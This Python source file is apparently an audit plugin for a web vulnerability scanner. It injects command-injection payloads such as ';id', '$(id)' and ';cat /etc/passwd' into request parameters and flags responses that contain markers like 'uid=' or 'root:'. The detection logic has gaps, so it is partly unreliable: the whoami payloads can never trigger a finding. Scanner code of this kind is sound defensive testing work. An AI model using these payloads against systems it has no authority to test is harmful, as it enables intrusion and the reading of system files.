"""OS Commanding (Command Injection) audit plugin."""

from __future__ import annotations

import asyncio
import re
from typing import Any

import structlog

from xfweb.core.plugins.plugin_base import AuditPlugin
from xfweb.core.net.http_engine import HttpEngine

logger = structlog.get_logger()

COMMAND_PAYLOADS = [
    (";id", ["uid=", "gid="]),
    ("|id", ["uid=", "gid="]),
    ("||id", ["uid=", "gid="]),
    ("&&id", ["uid=", "gid="]),
    ("`id`", ["uid=", "gid="]),
    ("$(id)", ["uid=", "gid="]),
    (";cat /etc/passwd", ["root:"]),
    ("|cat /etc/passwd", ["root:"]),
    (";whoami", []),  # Check for non-error response
    ("||whoami", []),
]

WIN_COMMAND_PAYLOADS = [
    (";type C:\\Windows\\System32\\drivers\\etc\\hosts", ["localhost"]),
    ("|type C:\\Windows\\System32\\drivers\\etc\\hosts", ["localhost"]),
]


class OsCommandingPlugin(AuditPlugin):
    """OS Command Injection vulnerability detector."""

    plugin_name = "os_commanding"
    brief_description = "Detect OS command injection vulnerabilities"

    async def audit(self, freq: Any, http: HttpEngine) -> None:
        params = self._extract_params(freq)
        if not params:
            return

        tasks = []
        for param_name, param_value in params.items():
            tasks.append(self._test_param(freq, param_name, param_value, http))
        await asyncio.gather(*tasks, return_exceptions=True)

    def _extract_params(self, freq: Any) -> dict[str, str]:
        params: dict[str, str] = {}
        if freq.post_data and isinstance(freq.post_data, str):
            for pair in freq.post_data.split("&"):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    params[k] = v
        if freq.url.query:
            for pair in freq.url.query.split("&"):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    params[k] = v
        return params

    async def _test_param(self, freq: Any, param: str, value: str, http: HttpEngine) -> None:
        all_payloads = COMMAND_PAYLOADS + WIN_COMMAND_PAYLOADS

        for payload, markers in all_payloads:
            modified_url = freq.url.raw_url.replace(
                f"{param}={value}",
                f"{param}={value}{payload}",
            )
            resp = await http.get(modified_url)

            if not markers:
                if resp.status_code == 200 and len(resp.body) > 0:
                    continue

            if resp.status_code == 200 and any(marker in resp.text for marker in markers):
                logger.warning(
                    "xfweb.os_commanding.vuln_found",
                    url=freq.url.raw_url,
                    param=param,
                    payload=payload,
                )
                return
